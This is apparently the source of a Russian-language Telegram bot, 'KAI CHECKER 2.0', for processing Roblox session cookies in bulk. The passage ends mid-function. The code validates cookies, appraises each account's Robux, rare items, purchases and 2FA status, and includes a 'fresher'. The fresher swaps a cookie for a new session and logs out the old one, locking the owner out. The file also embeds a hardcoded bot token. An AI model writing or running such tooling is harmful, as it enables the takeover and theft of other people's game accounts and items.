import telebot
import os
import time
import threading
import requests
import json
import re
import urllib.parse
import zipfile
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask
from requests.adapters import HTTPAdapter
from curl_cffi.requests import AsyncSession
import asyncio
import sys
import logging
import urllib3

# ============================================================
# НАСТРОЙКИ
# ============================================================

for var in list(os.environ.keys()):
    if 'proxy' in var.lower() or 'socks' in var.lower(): os.environ.pop(var, None)
from telebot import apihelper
apihelper.proxy = {}

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8838554185:AAEcnODJD01mvseF2Lnvr3WbYB88Y2KTNAk")
MAX_THREADS = 3
LOGO_URL = "https://1s4oyld5dc.ucarecd.net/c1f49818-fb27-4bf7-9427-1ed661dc880d/"
ALLOWED_USERS = [5992692128]

# ============================================================
# FLASK ДЛЯ RENDER
# ============================================================

app = Flask(__name__)

@app.route('/')
def index():
    return "🤖 БОТ РАБОТАЕТ! ✅"

@app.route('/health')
def health():
    return "OK", 200

# ============================================================
# ЛОГИ
# ============================================================

os.makedirs("data/profiles", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("input", exist_ok=True)
os.makedirs("output", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    cffi_requests = None
    HAS_CFFI = False

# ============================================================
# СЛОВАРЬ ИГР
# ============================================================

MAIN_GAMES = {
    "blox fruits", "rivals", "adopt me", "pet sim 99",
    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
    "combat warriors", "creatures of sonaria", "driving empire", "evade",
    "ro ghoul", "royale high", "toilet td", "trident survival",
    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
    "garden td", "jujutsu infinite", "jujutsu shenanigans",
    "tds", "volleyball legends", "arsenal", "bee swarm",
    "dress to impress"
}

def is_main_game(game_name: str) -> bool:
    if not game_name:
        return False
    g_lower = game_name.lower().strip()
    for mg in MAIN_GAMES:
        if mg in g_lower or g_lower in mg:
            return True
    return False

# ============================================================
# ФУНКЦИИ
# ============================================================

def extract_cookies(text):
    if not text:
        return []
    text = urllib.parse.unquote(text)
    cookies = []
    for match in re.finditer(r'\.?ROBLOSECURITY\s*[=:]\s*([^\s;]+)', text, re.IGNORECASE):
        c = match.group(1).strip('"\';')
        if len(c) > 100 and c not in cookies:
            cookies.append(c)
    for match in re.finditer(r'_\|WARNING[^|]*\|_\S{80,}', text):
        c = match.group(0).strip('"\'')
        if len(c) > 100 and c not in cookies:
            cookies.append(c)
    if not cookies:
        for line in text.splitlines():
            line = line.strip().strip('"\';')
            if len(line) > 100 and line not in cookies:
                cookies.append(line)
    return cookies

def create_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    })
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    return s

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'EmailSet': False, 'TwoFactorEnabled': False, 'Premium': False,
        'TotalRAP': 0, 'RareItems': [], 'PurchasedGamepasses': {},
        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
    }
    try:
        s = create_session(cookie)
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=5, verify=False)
        if r.status_code != 200:
            return info
        d = r.json()
        info['UserID'] = d.get('id')
        info['Username'] = d.get('name')
        info['status'] = '✅'
        uid = info['UserID']
        
        def fetch(url):
            try:
                r = s.get(url, timeout=5, verify=False)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}
        
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {
                'settings': ex.submit(fetch, 'https://www.roblox.com/my/settings/json'),
                'robux': ex.submit(fetch, f'https://economy.roblox.com/v1/users/{uid}/currency'),
                'rap': ex.submit(fetch, f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=50&sortOrder=Desc'),
            }
            results = {k: f.result() for k, f in futures.items()}
        
        if results.get('settings'):
            d = results['settings']
            info['Premium'] = d.get('IsPremium', False)
            sec = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = sec.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
            security_score = 0
            if info['EmailSet']: security_score += 1
            if info['TwoFactorEnabled']: security_score += 2
            if security_score >= 4:
                info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
            elif security_score >= 2:
                info['SecurityStatus'] = '🔐 СРЕДНИЙ'
            else:
                info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
        
        if results.get('robux'):
            info['Robux'] = results['robux'].get('robux', 0)
        
        if results.get('rap'):
            data = results['rap'].get('data', [])
            tr = 0
            ri = []
            for item in data[:20]:
                rap = item.get('recentAveragePrice', 0) or 0
                tr += rap
                if rap >= 1000:
                    ri.append({'name': item.get('name', '?'), 'rap': rap})
            info['TotalRAP'] = tr
            info['RareItems'] = ri[:5]
        
        try:
            r = s.get(f'https://economy.roblox.com/v2/users/{uid}/transactions?limit=50&transactionType=Purchase', timeout=5, verify=False)
            if r.status_code == 200:
                gp_dict = {}
                for item in r.json().get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    if price >= 100:
                        name = details.get('name', 'Товар')
                        place_name = details.get('place', {}).get('name', 'Неизвестная игра')
                        if place_name not in gp_dict:
                            gp_dict[place_name] = []
                        gp_dict[place_name].append({'name': name, 'price': price})
                info['PurchasedGamepasses'] = gp_dict
        except:
            pass
        
    except Exception as e:
        pass
    return info

# ============================================================
# ФОРМАТИРОВАНИЕ ОТЧЁТА
# ============================================================

def format_short_report(info):
    un = info.get('Username', '?')
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"<b>📋 {un}</b> [{year}]\n"
    r += f"{status_icon} {status_text} | 🆔 <code>{info.get('UserID', '?')}</code>\n\n"
    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    
    rap = info.get('TotalRAP', 0)
    if rap > 0:
        r += f"💎 RAP: ⏣ {rap:,}\n"
    else:
        r += f"💎 RAP: ❌ Нет\n"
    
    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    
    gp = info.get('PurchasedGamepasses', {})
    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
    
    if main_gp:
        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
        for game, passes in list(main_gp.items())[:5]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:3]:
            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
    else:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
    
    if len(r) > 3800:
        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
    
    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"

def generate_full_txt_report(info):
    un = info.get('Username', '?')
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"╔══════════════════════════════════════════════════════════╗\n"
    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {un} [{year}]\n"
    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    r += f"╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
    
    gp = info.get('PurchasedGamepasses', {})
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"║      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"║  ❌ Нет геймпассов\n"
    
    rare = info.get('RareItems', [])
    if rare:
        r += f"╠══════════════════════════════════════════════════════════╣\n"
        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
        for item in rare[:10]:
            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
    
    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
    return r

def save_txt(info):
    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fn, 'w', encoding='utf-8') as f:
        f.write(generate_full_txt_report(info))
    return fn

# ============================================================
# ФРЕШЕР
# ============================================================

async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    if not HAS_CFFI:
        return False, None, "❌ Установите curl_cffi"
    logs = []
    headers_base = {
        "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/"
    }
    async with AsyncSession(impersonate="chrome120") as session:
        r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=8)
        csrf_token = r_csrf.headers.get("x-csrf-token")
        if not csrf_token:
            return False, None, "❌ Не удалось получить CSRF token"
        ticket_headers = headers_base.copy()
        ticket_headers.update({
            "x-csrf-token": csrf_token,
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        })
        r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=8)
        ticket = r_ticket.headers.get("rbx-authentication-ticket")
        if not ticket:
            return False, None, "❌ Ошибка генерации ticket"
        redeem_headers = {
            "User-Agent": "Roblox/WinInet",
            "RBXAuthenticationNegotiation": "1",
            "Content-Type": "application/json"
        }
        r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=8)
        new_cookie = None
        set_cookie_hdr = r_redeem.headers.get("set-cookie", "")
        if ".ROBLOSECURITY=" in set_cookie_hdr:
            parts = set_cookie_hdr.split(".ROBLOSECURITY=")
            if len(parts) > 1:
                new_cookie = parts[1].split(";")[0]
        if not new_cookie or new_cookie == old_cookie:
            return False, None, "❌ Не удалось извлечь новый кук"
        if kill_old:
            await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=4)
            logs.append("✅ Старая сессия инвалидирована")
        else:
            logs.append("ℹ️ Старая сессия сохранена")
        return True, new_cookie, "\n".join(logs)

def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    loop = None
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
        return res
    except Exception as e:
        return False, None, f"[ERROR] {e}"
    finally:
        if loop and not loop.is_closed():
            loop.close()

def log_check(uid, info):
    ds = datetime.now().strftime('%d.%m.%Y')
    with open(f"data/logs/checks_{ds}.txt", 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {info.get('status', '?')} | {info.get('Username', '?')} | ⏣ {info.get('Robux', 0):,}\n")

# ============================================================
# КЛАСС ПОЛЬЗОВАТЕЛЯ
# ============================================================

class UserStats:
    def __init__(self, uid):
        self.uid = uid
        self.tc = 0
        self.v = 0
        self.iv = 0
        self.b = 0
        self.tr = 0
        self.td = 0
        self.st = datetime.now()
        self.ca = []
        self.pf = f"data/profiles/{uid}.json"
        self.load()

    def save(self):
        d = {'uid': self.uid, 'tc': self.tc, 'v': self.v, 'iv': self.iv,
             'b': self.b, 'tr': self.tr, 'td': self.td,
             'st': self.st.isoformat(), 'ca': self.ca[-50:]}
        try:
            json.dump(d, open(self.pf, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
        except:
            pass

    def load(self):
        try:
            if os.path.exists(self.pf):
                d = json.load(open(self.pf, 'r', encoding='utf-8'))
                self.tc, self.v, self.iv = d.get('tc', 0), d.get('v', 0), d.get('iv', 0)
                self.b, self.tr, self.td = d.get('b', 0), d.get('tr', 0), d.get('td', 0)
                self.st = datetime.fromisoformat(d.get('st', datetime.now().isoformat()))
                self.ca = d.get('ca', [])
        except:
            pass

    def add(self, r):
        self.tc += 1
        if '✅' in r.get('status', ''):
            self.v += 1
            self.tr += r.get('Robux', 0)
            self.td += abs(r.get('OutgoingRobuxYear', 0))
            self.ca.append({'u': r.get('Username', '?'), 'r': r.get('Robux', 0), 't': datetime.now().strftime('%d.%m.%Y %H:%M')})
        elif '🚫' in r.get('status', ''):
            self.b += 1
        else:
            self.iv += 1
        self.save()

    def get_stats(self):
        u = datetime.now() - self.st
        d = u.days
        h = u.seconds // 3600
        m = (u.seconds % 3600) // 60
        vp = (self.v / self.tc * 100) if self.tc > 0 else 0
        rc = "\n".join([f"└─ {a['u']} (⏣ {a['r']:,})" for a in self.ca[-5:]]) if self.ca else "└─ Никого"
        return f"<blockquote><b>👤 ПРОФИЛЬ</b>\n\n⏱ {d}д {h}ч {m}м | 🔍 {self.tc}\n✅ {self.v} ({vp:.0f}%) | ❌ {self.iv} | 🚫 {self.b}\n💰 ⏣ {self.tr:,} | 💸 {self.td:,}\n\n🕒 Последние:\n{rc}</blockquote>"

# ============================================================
# КЛАСС БОТА
# ============================================================

class Bot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.waiting = {}
        self.checking = False
        self.user_stats = {}
        self.last_cookie = {}
        self.setup()

    def get_user_stats(self, uid):
        if uid not in self.user_stats:
            self.user_stats[uid] = UserStats(uid)
        return self.user_stats[uid]

    def is_allowed(self, uid):
        return uid in ALLOWED_USERS

    def continue_menu(self):
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            telebot.types.InlineKeyboardButton("🔄 Проверить ещё", callback_data="check_again"),
            telebot.types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back")
        )
        return kb

    def main_menu(self):
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            telebot.types.InlineKeyboardButton("🔍 Чекер", callback_data="menu_checker"),
            telebot.types.InlineKeyboardButton("🔄 Фрешер", callback_data="menu_fresher")
        )
        kb.add(
            telebot.types.InlineKeyboardButton("✅ Валидатор", callback_data="menu_validator"),
            telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="menu_stats")
        )
        kb.add(
            telebot.types.InlineKeyboardButton("📂 Сортер", callback_data="menu_sorter"),
            telebot.types.InlineKeyboardButton("✂️ Разделитель", callback_data="menu_split")
        )
        kb.add(
            telebot.types.InlineKeyboardButton("📦 Слияние", callback_data="menu_merge"),
            telebot.types.InlineKeyboardButton("ℹ️ Инфо", callback_data="menu_info")
        )
        return kb

    def back_button(self):
        return telebot.types.InlineKeyboardMarkup().add(telebot.types.InlineKeyboardButton("◀️ Назад", callback_data="menu_back"))

    def mc(self):
        return "<b>🔍 KAI CHECKER 2.0</b>\n\n✅ Быстрая проверка куков\n🔄 Фрешер (новый, быстрее)\n✅ Валидатор (отсеивает мёртвые)\n📂 Сортер (по одному в файл)\n✂️ Разделитель (на части)\n📦 Слияние (удаляет дубли)\n📊 Статистика по аккаунтам\n\n<i>Выбери действие в меню ↓</i>"

    def setup(self):
        @self.bot.message_handler(commands=['start'])
        def start(msg):
            if not self.is_allowed(msg.chat.id):
                return
            self.waiting.pop(msg.chat.id, None)
            self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

        @self.bot.callback_query_handler(func=lambda call: True)
        def hc(call):
            if not self.is_allowed(call.message.chat.id):
                return
            cid = call.message.chat.id
            mid = call.message.message_id

            if call.data == "check_again":
                self.waiting[cid] = 'checker'
                self.bot.edit_message_text(
                    "<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь кук</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
                return

            if call.data.startswith("retry_"):
                mode = call.data.replace("retry_", "")
                cookie = self.last_cookie.get(cid)
                if not cookie:
                    self.bot.edit_message_text("❌ Нет кука.", chat_id=cid, message_id=mid)
                    return
                self.checking = False
                try:
                    self.bot.delete_message(cid, mid)
                except:
                    pass
                if mode == "fresher":
                    self.process_fresher(call.message, cookie)
                return

            if call.data == "menu_checker":
                self.waiting[cid] = 'checker'
                self.bot.edit_message_caption(
                    "<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь кук</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_fresher":
                self.waiting[cid] = 'fresher'
                self.bot.edit_message_caption(
                    "<b>🔄 ФРЕШЕР</b>\n<blockquote>📨 Отправь кук\n⚠️ Старая кука сломается!</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_validator":
                self.waiting[cid] = 'validator'
                self.bot.edit_message_caption(
                    "<b>✅ ВАЛИДАТОР</b>\n<blockquote>📨 Отправь .txt файл с куками</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_stats":
                self.waiting.pop(cid, None)
                self.bot.edit_message_caption(
                    self.get_user_stats(str(cid)).get_stats(),
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_sorter":
                self.waiting[cid] = 'sorter'
                self.bot.edit_message_caption(
                    "<b>📂 СОРТЕР</b>\n<blockquote>📨 Отправь .txt файл с куками\nЯ разобью их по одному в файл</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_split":
                self.waiting[cid] = 'split'
                self.bot.edit_message_caption(
                    "<b>✂️ РАЗДЕЛИТЕЛЬ</b>\n<blockquote>📨 Отправь .txt файл с куками\nЯ разделю его на 5 частей</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_merge":
                self.waiting[cid] = 'merge'
                self.bot.edit_message_caption(
                    "<b>📦 СЛИЯНИЕ</b>\n<blockquote>📨 Отправь несколько .txt файлов\nЯ соединю их в один и удалю дубли</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_info":
                self.waiting.pop(cid, None)
                self.bot.edit_message_caption(
                    "<b>ℹ️ ИНФО</b>\n<blockquote>🤖 KAI CHECKER 2.0\n\n📊 Что умеет:\n├─ 🔍 Быстрая проверка куков\n├─ 🔄 Фрешер (быстрый)\n├─ ✅ Валидатор\n├─ 📂 Сортер (по одному)\n├─ ✂️ Разделитель (на части)\n├─ 📦 Слияние (удаляет дубли)\n├─ 👤 Профиль\n└─ 💾 Статистика</blockquote>",
                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
                )
            elif call.data == "menu_back":
                self.waiting.pop(cid, None)
                try:
                    self.bot.edit_message_caption(caption=self.mc(), chat_id=cid, message_id=mid,
                                                  reply_markup=self.main_menu(), parse_mode='HTML')
                except:
                    self.bot.send_photo(cid, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

        @self.bot.message_handler(content_types=['document'])
        def hf(msg):
            if not self.is_allowed(msg.chat.id):
                return
            if self.checking:
                self.bot.reply_to(msg, "⏳ Подожди...")
                return
            
            mode = self.waiting.get(msg.chat.id, 'checker')
            
            try:
                if not msg.document.file_name.endswith('.txt'):
                    self.bot.reply_to(msg, "❌ Только .txt")
                    return
                
                fi = self.bot.get_file(msg.document.file_id)
                dw = self.bot.download_file(fi.file_path)
                ct = dw.decode('utf-8', errors='ignore')
                
                if mode == 'validator':
                    cookies = extract_cookies(ct)
                    if not cookies:
                        self.bot.reply_to(msg, "❌ Не найдены куки в файле")
                        return
                    self.process_validator(msg, cookies)
                elif mode == 'sorter':
                    cookies = extract_cookies(ct)
                    if not cookies:
                        self.bot.reply_to(msg, "❌ Куки не найдены")
                        return
                    self.process_sorter(msg, cookies)
                elif mode == 'split':
                    cookies = extract_cookies(ct)
                    if not cookies:
                        self.bot.reply_to(msg, "❌ Куки не найдены")
                        return
                    self.process_split(msg, cookies)
                else:
                    cks = extract_cookies(ct)[:5]
                    if not cks:
                        self.bot.reply_to(msg, "❌ Не найдены куки")
                        return
                    self.waiting.pop(msg.chat.id, None)
                    self.bulk_check(msg, cks)
            except Exception as e:
                self.bot.reply_to(msg, f"❌ {e}")

        @self.bot.message_handler(func=lambda m: True)
        def ht(msg):
            if not self.is_allowed(msg.chat.id):
                return
            if self.checking:
                self.bot.reply_to(msg, "⏳ Подожди...")
                return

            mode = self.waiting.get(msg.chat.id, 'checker')
            
            # Обработка слияния
            if mode == 'merge':
                if msg.document and msg.document.file_name.endswith('.txt'):
                    self.process_merge_single(msg)
                else:
                    self.bot.reply_to(msg, "📦 Отправь .txt файл с куками\nЯ буду ждать следующие файлы...")
                    self.waiting[msg.chat.id] = 'merge_collect'
                    self.merge_files = []
                    self.merge_files.append(msg.document)
                return
            
            if mode == 'merge_collect':
                if msg.document and msg.document.file_name.endswith('.txt'):
                    if not hasattr(self, 'merge_files'):
                        self.merge_files = []
                    self.merge_files.append(msg.document)
                    self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")
                return
            
            cks = extract_cookies(msg.text)
            
            if cks:
                self.waiting.pop(msg.chat.id, None)
                if mode == 'fresher':
                    self.process_fresher(msg, cks[0])
                else:
                    self.single_check(msg, cks[0])
            else:
                self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

        @self.bot.message_handler(commands=['done'])
        def done_merge(msg):
            if not self.is_allowed(msg.chat.id):
                return
            if hasattr(self, 'merge_files') and len(self.merge_files) >= 2:
                self.process_merge_files(msg)
            else:
                self.bot.reply_to(msg, "❌ Нужно минимум 2 файла для слияния")

    # ============================================================
    # ЧЕКЕР
    # ============================================================

    def single_check(self, msg, cookie):
        self.checking = True
        st = self.bot.reply_to(msg, "🔍 Быстрая проверка...")
        info = get_full_info(cookie)
        uid = str(msg.chat.id)
        self.get_user_stats(uid).add(info)
        log_check(uid, info)
        
        report = format_short_report(info)
        try:
            self.bot.edit_message_text(report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
        except:
            clean_report = report.replace("<blockquote>", "").replace("</blockquote>", "")
            self.bot.edit_message_text(clean_report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
        
        fn = save_txt(info)
        with open(fn, 'rb') as f:
            self.bot.send_document(msg.chat.id, f, caption=f"📄 Полный отчёт {info.get('Username', '?')}")
        os.remove(fn)
        
        self.bot.send_message(msg.chat.id, "✅ Чек завершен!", reply_markup=self.continue_menu(), parse_mode='HTML')
        self.checking = False

    def bulk_check(self, msg, cookies):
        self.checking = True
        total = len(cookies)
        st = self.bot.reply_to(msg, f"🔍 Проверяю {total} куков...", parse_mode='HTML')
        all_info = []
        uid = str(msg.chat.id)
        stats = self.get_user_stats(uid)
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            fs = [ex.submit(get_full_info, c) for c in cookies]
            for f in as_completed(fs):
                try:
                    info = f.result()
                    all_info.append(info)
                    stats.add(info)
                    log_check(uid, info)
                except:
                    pass
        valid_count = len([i for i in all_info if i.get('status') == '✅'])
        self.bot.send_message(msg.chat.id, f"<b>📊 ОТЧЕТ</b>\n✅ Валид: {valid_count}/{total}", parse_mode='HTML')
        
        for info in all_info:
            if info.get('status') == '✅':
                try:
                    fn = save_txt(info)
                    with open(fn, 'rb') as f:
                        self.bot.send_document(msg.chat.id, f, caption=f"📄 Полный отчёт {info.get('Username', '?')}")
                    os.remove(fn)
                except:
                    pass
        self.bot.send_message(msg.chat.id, "✅ Чек завершен!", reply_markup=self.continue_menu(), parse_mode='HTML')
        self.checking = False

    # ============================================================
    # ФРЕШЕР
    # ============================================================

    def process_fresher(self, msg, cookie):
        self.checking = True
        self.last_cookie[msg.chat.id] = cookie
        st = self.bot.reply_to(msg, "🔄 Фрешер...", parse_mode='HTML')

        def do():
            try:
                ok, new_cookie, log_text = refresh_cookie_sync(cookie)
                
                if ok:
                    self.bot.edit_message_text(
                        f"<b>🔄 ✅ ФРЕШЕР УСПЕШЕН!</b>\n\n"
                        f"<blockquote>📋 Новая кука:\n"
                        f"<code>{new_cookie}</code></blockquote>",
                        chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
                    )
                    filename = f"fresh_cookie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(new_cookie)
                    with open(filename, "rb") as f:
                        self.bot.send_document(msg.chat.id, f, caption="📄 Новая кука")
                    os.remove(filename)
                else:
                    self.bot.edit_message_text(
                        f"<b>❌ ОШИБКА ФРЕШЕРА</b>\n\n{log_text}",
                        chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
                    )
                
                log_filename = f"fresh_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(log_filename, "w", encoding="utf-8") as f:
                    f.write(log_text)
                with open(log_filename, "rb") as f:
                    self.bot.send_document(msg.chat.id, f, caption="📋 Лог фрешера")
                os.remove(log_filename)
                
            except Exception as e:
                self.bot.edit_message_text(
                    f"<b>❌ ОШИБКА</b>\n\n{str(e)}",
                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
                )
            finally:
                self.checking = False

        import threading
        threading.Thread(target=do).start()

    # ============================================================
    # ВАЛИДАТОР
    # ============================================================

    def process_validator(self, msg, cookies):
        self.checking = True
        st = self.bot.reply_to(msg, f"✅ Проверяю {len(cookies)} куков...", parse_mode='HTML')
        
        def do():
            try:
                valid = []
                invalid = []
                for c in cookies:
                    s = create_session(c)
                    r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=3, verify=False)
                    if r.status_code == 200:
                        valid.append(c)
                    else:
                        invalid.append(c)
                
                self.bot.edit_message_text(
                    f"<b>✅ ВАЛИДАЦИЯ ЗАВЕРШЕНА</b>\n\n"
                    f"Всего: {len(cookies)}\n"
                    f"✅ Валидных: {len(valid)}\n"
                    f"❌ Невалидных: {len(invalid)}",
                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
                )
                
                if valid:
                    filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write('\n'.join(valid))
                    with open(filename, "rb") as f:
